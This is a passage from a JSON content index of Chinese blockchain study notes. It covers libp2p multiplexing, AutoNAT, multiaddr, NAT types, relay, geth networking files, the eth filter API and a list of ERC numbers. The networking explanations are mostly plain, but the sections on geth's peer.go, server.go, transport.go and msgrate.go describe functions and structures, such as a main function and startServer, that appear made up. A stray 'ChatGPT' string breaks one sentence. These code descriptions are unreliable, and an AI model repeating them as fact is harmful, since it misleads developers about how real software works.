的数据流，使传输更有效。流多路复用使得运行在libp2p之上的应用程序或协议认为它们是运行在该连接之上的唯一实例。另一个例子是HTTP/2将流引入了HTTP中，允许在同一个连接上并行执行多个HTTP请求。\n综上所述，流复用可以被用于在libp2p之上的应用程序之间共享单个连接，提供更有效的解决方案，特别是在建立连接开销很大时，例如需要进行NAT打洞时。通过仅建立一次连接并通过同一连接运行多个流，libp2p可以减少与频繁建立连接相关的资源开销和延迟惩罚。\nlibp2p中的流复用器\n流连接多路复用器是libp2p栈的关键组件，为节点提供可插拔的多路复用功能。libp2p主机可以同时支持多个多路复用器，并且节点之间在初始连接握手期间协商多路复用器的选择。此协商协议允许libp2p在未来采用新的多路复用器并保持向后兼容性与现有多路复用器。\n💡\n对于构建libp2p应用程序的开发人员，与流连接多路复用器的交互通常仅限于初始配置阶段。libp2p栈自动处理多路复用器的协商和设置，确保所有连接都是流多路复用的，并允许在单个连接上无缝传输多个流的数据。\n当前，libp2p支持两个流连接多路复用器，即mplex和yamux。然而，libp2p栈中可用的许多传输协议都具有本地流连接，例如QUIC，WebTransport和WebRTC，在这些情况下，libp2p不需要执行流多路复用，因为协议已经提供了它。\nSwitch\nlibp2p通过名为交换机（或“swarm”（根据实现不同））的组件维护关于已知节点和现有连接的一些状态。 该交换机提供了一种拨号和监听接口，用于抽象给定连接所使用的流多路复用器的详细信息。\n在配置libp2p时，应用程序启用流多路复用模块，当拨号节点并监听连接时，交换机将使用这些模块。如果远程节点支持任何相同的流多路复用器实现，则在建立连接时交换机将选择并使用它。如果您拨打交换机已经存在的一个已经打开的连接的节点，新的数据流将自动启用现有连接进行多路复用。\n在连接建立过程的早期阶段，就会协商选用哪种流多路复用器。节点使用协议协商来协商共同支持的多路复用器，该多路复用器将“原始”传输连接升级为能够打开新流的复用连接。\nmplex\nmplex是libp2p早期设计的一个简单的流连接多路复用器。它是一个简单的协议，不提供其他流连接多路复用器提供的许多功能。值得注意的是，mplex不提供流量控制，这是现在被认为是流连接多路复用器的关键功能之一。\nmplex在两个对等方之间的可靠、有序的通道上运行，例如TCP连接。对等方可以打开、写入、关闭和重置一个流。mplex使用像yamux一样的基于消息的编帧层，使其能够复用不同的数据流，包括面向流的数据和其他类型的消息。\n缺点：\nmplex没有任何流量控制。\nBackpressure是一种机制，用于防止一个节点压垮耗时的数据的接收端。\nmplex也不限制节点可以打开的数据流的数量。\n在libp2p中应该使用Yamux而不是mplex。因为Yamux本身支持流量控制，所以更适用于需要传输大量数据的应用程序。\n直到最近，mplex仍然受到支持的原因是与没有yamux支持的js-libp2p兼容。现在js-libp2p已经具备了yamux支持，所以仅应使用mplex来提供向遗留节点提供向后兼容性。\nYamux\nYamux（又一个多路复用器）是libp2p中使用的强大的流连接多路复用器。它最初由Hashicorp为Go开发，现在在Rust、JavaScript和其他语言中实现。 它在单个TCP连接上允许多个并行数据流。它的设计灵感来自SPDY（后来成为HTTP / 2的基础），但它与它不兼容。\nYamux的关键特性之一是其支持通过背压进行流量控制。该机制用于在数据发送方和接收方之间协调数据传输速度的方法。当数据发送方发送数据的速度超过接收方处理数据的速度时，就会发生背压。接收者可以发送一个信号给发送方，表示它无法快速处理所有数据，并请求发送方减慢数据的发送速度。这种机制可以防止接收器被淹没并导致数据丢失，同时可以尽可能地提高数据吞吐量。这种机制在许多网络应用程序的设计中是至关重要的，因为它有助于保持网络流畅并防止资源浪费\n在libp2p中应该使用Yamux而不是mplex，因为mplex不提供在流程级别上应用背压的机制。"},"blockchainguide/Public_Chain_Development/P2P_Network/p2p/死磕libp2p网络之autoNAT":{"slug":"blockchainguide/Public_Chain_Development/P2P_Network/p2p/死磕libp2p网络之autoNAT","filePath":"blockchainguide/Public_Chain_Development/P2P_Network/p2p/死磕libp2p网络之autoNAT.md","title":"死磕libp2p网络之autoNAT","links":[],"tags":[],"content":"# 什么是Nats\n当流量在网络边界之间移动时，很常见的一个过程是网络地址转换。网络地址转换（NAT）将一个地址从一个地址空间映射到另一个地址空间。\nNAT允许多台计算机共享一个公共地址，这对于IPv4协议的持续运行至关重要。否则，IPv4协议的32位地址空间将无法满足现代网络人口的需求。\n例如，当我连接到家庭wifi时，我的计算机会得到一个IPv4地址10.0.1.15。这是为私有网络保留的IP地址范围之一。当我发起对公共IP地址的外部连接时，路由器会将我的内部IP替换为它自己的公共IP地址。当数据从另一端回来时，路由器会再次将其转换回内部地址。\n虽然对于外发连接来说，NAT通常是透明的，但监听传入连接需要一些配置。路由器只监听一个公共IP地址，但内部网络中的任意数量的机器都可能处理请求。为了提供服务，您的路由器必须被配置为将某些流量发送到特定的机器，通常是通过将一个或多个TCP或UDP端口从公共IP映射到内部IP。\n虽然手动配置路由器通常是可能的，但并不是每个想要运行点对点应用程序或其他网络服务的人都有这样的能力。\n我们希望libp2p应用程序可以在任何地方运行，不仅仅限于数据中心或具有稳定公共IP地址的机器。为了实现这一点，以下是在libp2p中可用的NAT穿透的主要方法。\n自动路由器配置\n许多路由器支持自动配置协议进行端口转发，最常见的是UPnP或nat-pmp。\n如果您的路由器支持这些协议之一，libp2p将尝试自动配置一个端口映射，以允许其监听传入流量。如果网络和libp2p实现支持，这通常是最简单的选择。\n什么是AutoNAT？\nAutoNAT允许节点请求其他节点拨打其所认为的公共地址。\n对于位于NAT后面的私有节点，强烈建议:\n\n\n不要公布私有地址\n\n\n通过中继获得预订，以改善与公共网络的连接，并发布中继地址。\n\n\n对于公共节点，建议：\n\n启动中继以协助其他节点\n考虑激活DHT服务器模式以改善与公共网络的连接。\n如果大多数此类拨号尝试成功，则节点可以相当确定它没有在NAT后面。另一方面，如果大多数这些拨号尝试失败，则强烈表明NAT正在阻止传入连接。\n\n要启动协议，节点向另一个节点发送一个Dial消息，其中包含多个地址列表。然后，节点使用与其常规libp2p连接不同的IP和节点ID尝试拨打这些地址。如果至少有一个拨号成功，则对方节点向请求节点发送一个带有ResponseStatus: SUCCESS的DialResponse消息。\n如果所有拨号都失败，则对方节点将发送一个带有ResponseStatus: E_DIAL_ERROR的DialResponse消息。请求节点可以使用对等方的响应来确定它是否在NAT后面。\n如果响应指示成功，则该节点很可能不在NAT后面，无需使用中继服务器来改善其连接。如果响应指示错误，则该节点很可能在NAT后面，可能需要使用中继服务器与网络中的其他节点进行通信。\n为了防止某些类型的攻击，AutoNAT的libp2p实现不能拨打未基于请求节点的IP地址的任何多地址，并且不能通过中继连接接受拨号请求（因为不可能验证通过中继连接到达的节点的IP地址）。\n这是为了防止放大攻击，在此攻击中，攻击者向许多客户端提供指向目标的相同的虚假映射地址，导致所有流量集中在目标上"},"blockchainguide/Public_Chain_Development/P2P_Network/p2p/死磕libp2p网络之mdns":{"slug":"blockchainguide/Public_Chain_Development/P2P_Network/p2p/死磕libp2p网络之mdns","filePath":"blockchainguide/Public_Chain_Development/P2P_Network/p2p/死磕libp2p网络之mdns.md","title":"死磕libp2p网络之mdns","links":[],"tags":[],"content":""},"blockchainguide/Public_Chain_Development/P2P_Network/p2p/死磕libp2p网络之multiAddress":{"slug":"blockchainguide/Public_Chain_Development/P2P_Network/p2p/死磕libp2p网络之multiAddress","filePath":"blockchainguide/Public_Chain_Development/P2P_Network/p2p/死磕libp2p网络之multiAddress.md","title":"死磕libp2p网络之multiAddress","links":[],"tags":[],"content":"概念\nlibp2p区分了peer 的身份和位置。peer 的身份是稳定的、可验证的，并且在对等方的整个生命周期内有效， peer 身份源于对等id规范中描述的公钥。\n在特定的网络上，在特定的时间点，peer可能有一个或多个位置，可以使用地址表示。例如，可以通过TCP端口1234上7.7.7.7的全局IPv4地址访问.\nLibp2p 是不受传输限制的，不单单是只支持tcp/udp的网络。为了实现这个目标，而无需专门评估每个寻址方案，LIBP2P使用MultiaDDR以自我描述方式为所有受支持的传输协议编码网络地址。multiaddr格式以及其实现，\n多地址在整个libp2p中用于编码网络地址。当地址需要在进程之间共享或交换时，它们被编码为multiaddr的二进制表示。\n当交换地址时，对等端发送一个包含其网络地址和对等端id的多地址，格式如下：\n/ip4/7.7.7.7/tcp/1234/p2p/QmYyQSo1c1Ym7orWxLYvCrM2EmxFTANf8wXmmE7DWjhx5N\n\n多地址是可以遍历到某个目标的指令序列。\n例如，/ip4/7.7.7.7/tcp/1234多地址以ip4开头，这是需要地址的最低级别协议。tcp协议运行在ip4之上，所以它是下一个。\n上面的multiaddr由两个组件组成，/ip4/7.7.7.7组件和/tcp/1234组件。不可能再分开一个/仅ip4是无效的多地址，因为ip4协议被定义为需要32位地址。同样，tcp需要16位端口号。\n尽管我们将/ip4/7.7.7.7和/tcp/1234称为较大tcp/IP地址的“组件”，但根据multiaddr规范，它们实际上都是有效的多地址。然而，并非每个语法上有效的多址都是网络中进程的功能描述。正如我们所看到的，即使是一个简单的TCP/IP连接也需要将两个多地址合并为一个。有关如何组合多地址的信息，请参阅“组合多地址”一节，有关描述有效传输地址的组合，请参阅传输多地址一节。\nmultiaddr协议表包含所有当前定义的协议及其地址组件的长度。"},"blockchainguide/Public_Chain_Development/P2P_Network/p2p/死磕p2p网络之NAT传输":{"slug":"blockchainguide/Public_Chain_Development/P2P_Network/p2p/死磕p2p网络之NAT传输","filePath":"blockchainguide/Public_Chain_Development/P2P_Network/p2p/死磕p2p网络之NAT传输.md","title":"死磕p2p网络之NAT传输","links":[],"tags":[],"content":"\nwww.jianshu.com/p/f71707892eb2\n\nNAT简介\nNAT（Network Address Translation，网络地址转换），也叫做网络掩蔽或者IP掩蔽。NAT是一种网络地址翻译技术，主要是将内部的私有IP地址（private IP）转换成可以在公网使用的公网IP（public IP）\nNAT类型\n在STUN标准中，根据私网IP地址和端口到NAT出口的公网IP地址和端口的映射方式，把NAT分为如下四种类型，详见下图。\n\n完全锥型NAT\n所有从同一个私网IP地址和端口（IP1:Port1）发送过来的请求都会被映射成同一个公网IP地址和端口（IP:Port）。并且，任何外部主机通过向映射的公网IP地址和端口发送报文，都可以实现和内部主机进行通信。\n这是一种比较宽松的策略，只要建立了私网IP地址和端口与公网IP地址和端口的映射关系，所有的Internet上的主机都可以访问该NAT之后的主机。\n限制锥型NAT\n所有从同一个私网IP地址和端口（IP1:Port1）发送过来的请求都会被映射成同一个公网IP和端口号（IP:Port）。与完全锥型NAT不同的是，当且仅当内部主机之前已经向公网主机发送过报文，此时公网主机才能向私网主机发送报文。\n端口限制锥型NAT\n与限制锥型NAT很相似，只不过它包括端口号。也就是说，一台公网主机（IP2:Port2）想给私网主机发送报文，必须是这台私网主机先前已经给这个IP地址和端口发送过报文。\n对称NAT\n所有从同一个私网IP地址和端口发送到一个特定的目的IP地址和端口的请求，都会被映射到同一个IP地址和端口。如果同一台主机使用相同的源地址和端口号发送报文，但是发往不同的目的地，NAT将会使用不同的映射。此外，只有收到数据的公网主机才可以反过来向私网主机发送报文。\n这和端口限制锥型NAT不同，端口限制锥型NAT是所有请求映射到相同的公网IP地址和端口，而对称NAT是不同的请求有不同的映射。\nNAT工作原理"},"blockchainguide/Public_Chain_Development/P2P_Network/p2p/死磕p2p网络之relay协议":{"slug":"blockchainguide/Public_Chain_Development/P2P_Network/p2p/死磕p2p网络之relay协议","filePath":"blockchainguide/Public_Chain_Development/P2P_Network/p2p/死磕p2p网络之relay协议.md","title":"死磕p2p网络之relay协议","links":[],"tags":[],"content":"\n当一个对等端无法监听公共地址时，它可以拨出到中继对等端，这将保持长期连接打开。其他对等方将能够使用p2p电路地址通过中继对等方拨号，从而将流量转发到其目的地。\n中继连接是端到端加密的，这意味着充当中继的对等方无法读取或篡改流经连接的任何流量\n\n应用场景\n假设我有一个对等ID为QmAlice的对等。我想把我的地址给我的朋友QmBob，但我有一个NAT，它不允许任何人直接给我打电话。\n\n节点A位于NAT和/或防火墙后面，例如通过AutoNAT服务检测到的。\n因此，节点A请求与中继R进行预约，即节点A请求中继R代表其侦听传入连接。\n节点B希望与节点a建立连接。鉴于节点a不公布任何直接地址，而只公布中继地址，节点B连接到中继R，要求中继R中继到a的连接。\n中继R将连接请求转发到节点A，并最终中继A和B发送的所有数据。\n参考\ngithub.com/libp2p/specs/blob/master/relay/circuit-v2.md"},"blockchainguide/Public_Chain_Development/P2P_Network/p2p/死磕p2p网络之传输协议":{"slug":"blockchainguide/Public_Chain_Development/P2P_Network/p2p/死磕p2p网络之传输协议","filePath":"blockchainguide/Public_Chain_Development/P2P_Network/p2p/死磕p2p网络之传输协议.md","title":"死磕p2p网络之传输协议","links":[],"tags":[],"content":"\n简单阐述tcp和udp 传输的区别\n常见的网络传输协议\n监听和拨号\nP2p 节点的地址格式\n"},"blockchainguide/Public_Chain_Development/P2P_Network/p2p_2":{"slug":"blockchainguide/Public_Chain_Development/P2P_Network/p2p_2","filePath":"blockchainguide/Public_Chain_Development/P2P_Network/p2p_2.md","title":"p2p_2","links":[],"tags":[],"content":"dial\n这段代码实现了dialer的主循环，用于执行P2P网络中的拨号操作。主要功能如下：\n\n可以启动新的拨号\n可以使用静态连接，不会从连接池中废除，一般静态连接用来标记重要节点，前期使用，比如bootnode节点add peer谁谁\n可以清楚历史的拨号记录\n可以处理节点的添加删除\n需要通过节点连接池和静态节点连接池来维护节点\n\npeer\npeer.go是Go-Ethereum中实现节点通信和交互的核心文件，它实现了节点发现、连接、消息传输、状态同步等功能。以下是v1.10.18版本中peer.go文件的详细分析：\n\nPeer结构体\n\nPeer结构体表示一个以太坊网络中的节点，包括节点的ID、地址、协议版本、网络ID、最近的ping和pong时间等信息。其中，节点ID是一个32个字节的唯一标识符，节点地址是一个包含IP地址和端口号的字符串，协议版本和网络ID用于协议兼容性和同步，ping和pong时间用于测试节点之间的连接性和延迟。Peer结构体实现了Conn接口，可以通过tcp或udp协议连接和通信。\n设计原理：Peer结构体是Go-Ethereum节点通信的基本单元，通过封装节点的基本信息和实现Conn接口，实现了节点之间的数据传输和通信。\n\npeerPool结构体\n\npeerPool结构体表示一个以太坊节点池，维护了当前连接的节点列表、最近的ping和pong时间等信息。其中，节点列表是一个PeerSet类型的集合，用于添加、删除和查询节点。peerPool结构体实现了PeerSet接口，可以对节点列表进行操作。\n设计原理：peerPool结构体是Go-Ethereum节点通信的管理器，通过封装节点列表和实现PeerSet接口，实现了节点的管理和查询。\n\npeerDiscovery接口\n\npeerDiscovery接口表示一个以太坊节点发现协议，用于发现和连接其他节点。Go-Ethereum中实现了多种节点发现协议，包括DNS、UPnP、以太坊节点协议等。其中，DNS和UPnP协议用于自动发现节点，以太坊节点协议用于主动连接其他节点。\n设计原理：peerDiscovery接口是Go-Ethereum节点发现的抽象，通过定义节点发现的接口和方法，实现了不同的节点发现协议的实现和切换。\n\npeerConn结构体\n\npeerConn结构体表示一个以太坊节点之间的连接，包括连接的本地地址、远程地址、连接的状态等信息。其中，本地地址和远程地址是一个包含IP地址和端口号的字符串，连接的状态包括已建立、已关闭、正在握手等。peerConn结构体实现了Conn接口，可以通过tcp或udp协议进行数据传输。\n设计原理：peerConn结构体是Go-Ethereum节点通信的基本单元，通过封装连接的基本信息和实现Conn接口，实现了节点之间的数据传输和通信。\n\npingHandler和pongHandler\n\npingHandler和pongHandler实现了ping和pong消息的处理，用于测试节点之间的连接性和延迟。其中，ping消息是由发起方发送给接收方，用于测试接收方是否在线，接收方收到ping消息后需要回复pong消息。如果在一定时间内没有收到pong消息，则认为连接已断开。\n设计原理：ping和pong消息是Go-Ethereum节点通信的基本消息，通过实现ping和pong消息的处理和回复，实现了节点之间的连接性测试和维护。\n\nstatusHandler\n\nstatusHandler实现了status消息的处理，用于同步节点之间的区块链状态和头信息。status消息包含当前节点的区块高度、最近的区块头信息、网络ID等信息，用于通知其他节点自己的状态和同步区块链。\n设计原理：status消息是Go-Ethereum节点通信的重要消息，通过实现status消息的处理和回复，实现了节点之间的状态同步和区块链同步。\n\ngetPeersHandler\n\ngetPeersHandler实现了getPeers消息的处理，用于获取当前节点的对等节点列表。getPeers消息由发起方发送给接收方，接收方需要回复当前节点的对等节点列表。对等节点列表中包含其他节点的ID和地址信息，用于节点发现和连接。\n设计原理：getPeers消息是Go-Ethereum节点通信的重要消息，通过实现getPeers消息的处理和回复，实现了节点之间的对等节点信息的交换和更新。\n\nnewPeer函数\n\nnewPeer函数创建一个新的以太坊节点，并返回一个Peer结构体。其中，节点ID和地址是根据输入的参数生成的，协议版本和网络ID是从全局配置中获取的。\n设计原理：newPeer函数是Go-Ethereum节点通信的创建函数，通过输入参数的生成和全局配置的获取，实现了节点的自动创建和初始化。\n\npeerCap函数\n\npeerCap函数返回一个字符串，表示当前节点的协议版本和支持的功能。其中，协议版本是从全局配置中获取的，支持的功能包括区块同步、交易同步、状态同步等。\n设计原理：peerCap函数是Go-Ethereum节点通信的功能函数，通过返回节点的协议版本和支持的功能，实现了节点之间的协议兼容性和交互。\n\npeerPoolConfig函数\n\npeerPoolConfig函数返回一个P2PConfig结构体，包含了节点池的配置信息，包括最大连接数、最大空闲时间、最大ping延迟等。\n设计原理：peerPoolConfig函数是Go-Ethereum节点通信的配置函数，通过返回节点池的配置信息，实现了节点池的管理和优化。\n综上，peer.go文件实现了Go-Ethereum节点通信的核心功能，包括节点发现、连接、消息传输、状态同步等。通过封装节点、连接、消息等基本单元和实现接口和方法，实现了节点之间的数据传输、通信和管理。其中，节点发现协议、ping/pong消息、status消息、getPeers消息等实现了节点之间的连接性测试、状态同步、对等节点信息交换等功能，为以太坊节点之间的交互提供了基础。同时，节点池和节点配置等实现了节点的管理和优化，提高了以太坊节点通信的性能和稳定性。\n\nmessage\nmessage.go文件位于p2p/rlpx包下，主要实现了RLPx协议中的消息编码和解码功能。主要功能如下：\n\nRLPxMessage接口：该接口定义了RLPx消息的编码和解码方法，包括GetPayload、GetMsgCode、Encode、Decode等方法。\nmessageCodeMap变量：该变量是一个map，用于存储RLPx消息类型和对应的消息编码之间的映射关系。\nmessageTypeInfo结构体：该结构体表示一个RLPx消息类型的相关信息，包括消息类型、消息名称、消息编码、消息长度等。\nmessageTypes变量：该变量是一个messageTypeInfo的切片，表示所有支持的RLPx消息类型及其相关信息。\nNewMessage函数：该函数用于根据给定的消息类型和消息体创建一个RLPx消息对象。\nDecodeMessage函数：该函数用于将收到的字节流解码成RLPx消息对象。解码过程中，函数首先读取消息类型和消息体长度，然后根据消息类型查找对应的消息编码，最后使用消息编码对消息体进行解码。\nEncodeMessage函数：该函数用于将RLPx消息编码成字节流。编码过程中，函数首先根据消息类型查找对应的消息编码，然后使用消息编码对消息体进行编码，最后将消息类型和编码后的消息体合并成一个字节流。\n\n总体来说，message.go文件实现了RLPx协议中的消息编码和解码功能，包括对各种RLPx消息类型进行编解码、消息长度的处理等。通过该文件，P2P节点可以将消息编码成字节流进行传输，或者将收到的字节流解码成消息进行处理。\nserver\nserver.go是geth中p2p网络层的核心文件之一，它实现了p2p网络中的各种功能，例如连接管理、消息广播、节点发现等。下面对server.go进行详细分析：\n\n数据结构定义\n\n在server.go中定义了多个数据结构，包括：\n\nServer：表示一个p2p服务器，包含多个连接、节点管理器、消息广播器等成员变量。\nconn：表示一个p2p连接，包含连接ID、连接状态、读写缓冲区等成员变量。\nremote：表示一个远程节点，包含节点ID、协议版本、网络地址等成员变量。\n\n\n主函数\n\nmain函数是server.go的入口函数，主要功能是启动p2p服务器和处理命令行参数。在启动服务器之前，需要读取配置文件中的参数，例如监听地址、端口号、节点ID等。如果没有指定节点ID，则会生成一个新的节点ID。之后，主函数会调用startServer函数启动p2p服务器。\n\n启动服务器\n\nstartServer函数会创建一个Server对象，然后开始监听指定的地址和端口号。在监听到新的连接请求时，会创建一个conn对象，并将其加入到Server的连接列表中。之后，会启动一个goroutine来处理该连接，该goroutine会调用handleConnection函数来处理该连接的读写操作。\n\n处理连接\n\nhandleConnection函数是一个无限循环，用于处理连接的读写操作。在循环开始时，会读取连接的协议版本号和节点ID，并将其保存到remote对象中。之后，会向远程节点发送自己的节点ID和协议版本号。接下来，会进入一个读取循环，不断从连接中读取数据并交给消息处理器处理。如果读取到错误或连接关闭，则会将连接从Server的连接列表中删除。\n\n消息处理器\n\n消息处理器负责处理连接中传输的各种消息，包括节点发现、交易、块、ping等。消息处理器会根据消息类型调用相应的处理函数进行处理。例如，如果收到了一个交易消息，则会调用handleTxMsg函数处理该交易。处理函数会将消息解码成相应的数据结构，并进行验证和处理。如果处理成功，则会将消息广播给其他节点。\n\n节点管理器\n\n节点管理器负责管理p2p网络中的所有节点，包括添加新节点、删除失效节点、更新节点状态等。节点管理器会定期向其他节点发送ping消息，以检测节点是否在线。如果节点长时间未响应，则会将其标记为失效节点，并从节点列表中删除。\n\n消息广播器\n\n消息广播器负责将收到的消息广播给其他节点。在收到一个新消息时，消息广播器会遍历所有连接，并将消息发送给所有连接对应的远程节点。如果发送失败，则会将连接标记为失效连接，并从连接列表中删除。\n\n总结\n\nserver.go是geth中p2p网络层的核心文件之一，实现了p2p网络中的各种功能，包括连接管理、消息广播、节点发现等。它通过多个协程并发处理连接和消息，实现了高效的网络通信。同时，它也提供了丰富的接口和回调函数，方便用户进行自定义扩展和处理。\ntransport\ntransport.go是geth中p2p网络层的另一个核心文件，它实现了p2p网络层的传输协议，包括数据加密、数据压缩、消息分包等功能。下面对transport.go进行详细分析：\n\n数据结构定义\n\n在transport.go中定义了多个数据结构，包括：\n\nTransport：表示一个p2p传输层，包含加密、压缩、消息分包等成员变量。\npacket：表示一个p2p消息包，包含消息类型、消息体、消息长度等成员变量。\n\n\n主函数\n\n主函数是transport.go的入口函数，主要功能是创建一个Transport对象，并设置加密、压缩等参数。之后，主函数会返回该Transport对象供上层调用。\n\n加密\n\n加密是p2p传输层的一个重要功能，可以保护消息的机密性和完整性。在Transport对象创建时，可以设置加密算法和密钥。在发送消息时，会将消息体进行加密，并在消息头中标记加密算法和密钥。在接收消息时，会根据消息头中的加密算法和密钥进行解密，并验证消息的完整性。\n\n压缩\n\n压缩是p2p传输层的另一个重要功能，可以减少消息的传输量，提高网络传输效率。在Transport对象创建时，可以设置压缩算法和压缩阈值。在发送消息时，会根据消息体的大小和压缩阈值来决定是否进行压缩。在接收消息时，会根据消息头中的压缩算法进行解压缩。\n\n消息分包\n\n消息分包是p2p传输层的第三个重要功能，可以将大的消息分成多个小的消息进行传输，以避免网络丢包和传输延迟。在Transport对象创建时，可以设置最大消息长度和分包大小。在发送消息时，如果消息体大小超过了最大消息长度，则会将消息分成多个小的消息进行传输。在接收消息时，会根据消息头中的分包信息将多个小的消息合并成一个完整的消息。\n\n总结\n\ntransport.go是geth中p2p网络层的另一个核心文件，实现了p2p网络层的传输协议，包括数据加密、数据压缩、消息分包等功能。它通过多个协程并发处理消息传输和处理，实现了高效的网络通信。同时，它也提供了丰富的接口和回调函数，方便用户进行自定义扩展和处理。\nmsgrate\nmsgrate.go是geth中p2p网络层中的一个辅助文件，用于帮助管理消息传输速率。它实现了多个限速算法，包括令牌桶算法、平滑限速算法等。下面对msgrate.go进行详细分析：\n\n数据结构定义\n\n在msgrate.go中定义了多个数据结构，包括：\n\nMsgRate：表示一个消息传输速率管理器，包含多个限速算法、速率统计器等成员变量。\nLimiter：表示一个消息限速器，包含一个限速算法和速率统计器等成员变量。\n\n\n限速算法\n\nmsgrate.go实现了多个限速算法，包括令牌桶算法、平滑限速算法等。这些算法都继承了Limiter接口，并实现了Limit方法，用于限制消息传输速率。在MsgRate对象创建时，可以选择使用哪种限速算法。\n\n统计速率\n\nMsgRate对象还包含了速率统计器，用于统计当前的消息传输速率。在发送消息时，会根据消息大小和发送时间更新速率统计器的状态。在处理限速时，会根据当前速率和限速算法计算出需要等待的时间。\n\n总结\n\nmsgrate.go是geth中p2p网络层中的一个辅助文件，用于帮助管理消息传输速率。它实现了多个限速算法，并提供了速率统计器，可以根据当前速率和限速算法进行限速。它通过实现Limiter接口，可以方便地扩展和替换限速算法。同时，它也提供了丰富的接口和回调函数，方便用户进行自定义扩展和处理。\n静态连接的概念\n静态连接一般是在节点的启动配置中进行指定的，用于建立与特定节点的连接。在以太坊网络中，静态连接通常用于建立与早期的、重要的节点的连接，以确保节点能够及时获取到最新的区块和交易信息。\n具体来说，以太坊网络中的静态连接一般是由节点运营者或者开发者在节点的启动配置中指定的。在启动节点时，可以通过命令行参数或者配置文件等方式指定静态连接，如下面的例子：\ngeth --bootnodes enode://&lt;enodeID&gt;@&lt;ip&gt;:&lt;port&gt;\n\n在上述命令中，enode://&lt;enodeID&gt;@&lt;ip&gt;:&lt;port&gt;表示要连接的静态节点的enode URL，其中&lt;enodeID&gt;是节点的ID，&lt;ip&gt;是节点的IP地址，&lt;port&gt;是节点的端口号。通过这种方式指定静态连接，可以保证节点与指定的静态节点建立连接。\n由于静态连接是预先指定的，因此在节点运行期间不会被连接池回收，从而确保了节点与特定节点之间的连接始终存在。这对于节点的稳定运行和网络同步非常重要。\n过滤器\n\n\neth/filters是以太坊客户端Geth中提供的一个API接口，用于实现事件过滤功能。它可以让开发者通过指定一些条件来过滤以太坊区块链上发生的事件，以便对感兴趣的事件进行监听和处理。\neth/filters的核心机制是过滤器（Filter），每个过滤器都是一个事件的筛选器，可以根据指定的条件对以太坊的交易和日志进行筛选。当一个交易或日志满足过滤器的条件时，就会触发相应的事件。\neth/filters提供了以下三种类型的过滤器：\n\n区块过滤器（Block Filter）：用于监听区块的产生，当新的区块被添加到区块链上时，就会触发相应的事件。\n交易过滤器（Transaction Filter）：用于监听交易的产生，当新的交易被添加到区块链上时，就会触发相应的事件。\n日志过滤器（Log Filter）：用于监听日志的产生，当新的日志被添加到区块链上时，就会触发相应的事件。\n\n对于每种类型的过滤器，都有一个对应的API方法可以创建和删除过滤器，以及查询符合条件的事件。下面我们分别介绍这些API方法的详细使用方法。\n\n区块过滤器（Block Filter）\n\n创建区块过滤器：\neth_newBlockFilter()\n该方法用于创建一个新的区块过滤器，返回一个整数（过滤器ID），表示该过滤器的唯一标识符。\n删除区块过滤器：\neth_uninstallFilter(filterID)\n该方法用于删除指定ID的区块过滤器，参数filterID为eth_newBlockFilter()方法返回的过滤器ID。\n查询符ChatGPT\n查询符合条件的事件：\neth_getFilterChanges(filterID)\n该方法用于查询某个区块过滤器中符合条件的事件，返回一个包含所有事件数据的数组，每个元素都是一个对象，包含了该事件的详细信息，如区块号、区块哈希等。\neth_getFilterLogs(filterID)\n该方法与eth_getFilterChanges(filterID)类似，用于查询某个区块过滤器中符合条件的事件，返回的数据格式与eth_getFilterChanges(filterID)相同，但是该方法会返回所有符合条件的日志，而不仅仅是最近一次查询到的事件。\n\n交易过滤器（Transaction Filter）\n\n创建交易过滤器：\neth_newPendingTransactionFilter()\n该方法用于创建一个新的交易过滤器，用于监听所有未确认的交易。返回一个整数（过滤器ID），表示该过滤器的唯一标识符。\neth_newBlockTransactionFilter(blockHash)\n该方法用于创建一个新的交易过滤器，用于监听指定区块内的交易。参数blockHash为指定区块的哈希值。返回一个整数（过滤器ID），表示该过滤器的唯一标识符。\n删除交易过滤器：\neth_uninstallFilter(filterID)\n该方法用于删除指定ID的交易过滤器，参数filterID为eth_newPendingTransactionFilter()或eth_newBlockTransactionFilter(blockHash)方法返回的过滤器ID。\n查询符合条件的事件：\neth_getFilterChanges(filterID)\n该方法用于查询某个交易过滤器中符合条件的事件，返回一个包含所有事件数据的数组，每个元素都是一个十六进制字符串，表示交易的哈希值。\neth_getFilterLogs(filterID)\n该方法与eth_getFilterChanges(filterID)类似，用于查询某个交易过滤器中符合条件的事件，返回的数据格式与eth_getFilterChanges(filterID)相同，但是该方法会返回所有符合条件的交易，而不仅仅是最近一次查询到的事件。\n\n日志过滤器（Log Filter）\n\n创建日志过滤器：\neth_newFilter(filterObject)\n该方法用于创建一个新的日志过滤器，参数filterObject是一个对象，用于指定过滤器的条件。该对象可以包含以下属性：\n\nfromBlock: 开始查询的区块号（十六进制字符串或整数）。\ntoBlock: 结束查询的区块号（十六进制字符串或整数）。\naddress: 监听的合约地址（十六进制字符串或数组）。\ntopics: 监听的事件主题，可以是一个或多个主题（数组）。\n\n返回一个整数（过滤器ID），表示该过滤器的唯一标识符。\n删除日志过滤器：\neth_uninstallFilter(filterID)\n该方法用于删除指定ID的日志过滤器，参数filterID为eth_newFilter(filterObject)方法返回的过滤器ID。\n查询符合条件的事件：\neth_getFilterChanges(filterID)\n该方法用于查询某个日志过滤器中符合条件的事件，返回一个包含所有事件数据的数组，每个元素都是一个对象，包含了该事件的详细信息，如区块号、区块哈希、合约地址、事件主题等。\neth_getFilterLogs(filterID)\n该方法与eth_getFilterChanges(filterID)类似，用于查询某个日志过滤器中符合条件的事件，返回的数据格式与eth_getFilterChanges(filterID)相同，但是该方法会返回所有符合条件的日志，而不仅仅是最近一次查询到的事件。\n需要注意的是，eth/filters API接口中的所有方法都是异步执行的，都需要使用回调函数来处理返回的结果。另外，创建过滤器时需要注意过滤条件的设置，以确保能够正确地筛选出目标事件。\n\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/ERC整理":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/ERC整理","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/ERC整理.md","title":"ERC整理","links":[],"tags":[],"content":"\n\nEIP2315：JUMPSUB 以及 RETSUB，用于简单的 EVM 子程序\n\n\nEIP2489：取消 GAS 操作码\n\n\nEIP2488：取消 CALLCODE 操作码\n\n\nERC2477：NFT 元数据完整性\n\n\nERC2537：BLS12-381 曲线运算\n\n\nERC2539：BLS12-377 曲线运算\n\n\nERC2542：加入 TXGASLIMIT、CALLGASLIMIT、TXGASREFUND 操作码\n\n\nERC2541：EY SW6-Bis 曲线运算\n\n\nERC2535：可升级合约的钻石标准\n\n\nERC2547：可组合的多层级 token\n\n\nERC2615：非同质属性标准\n\n\nERC2612：ERC20 的许可插件\n\n\nERC2611：Geotimeline 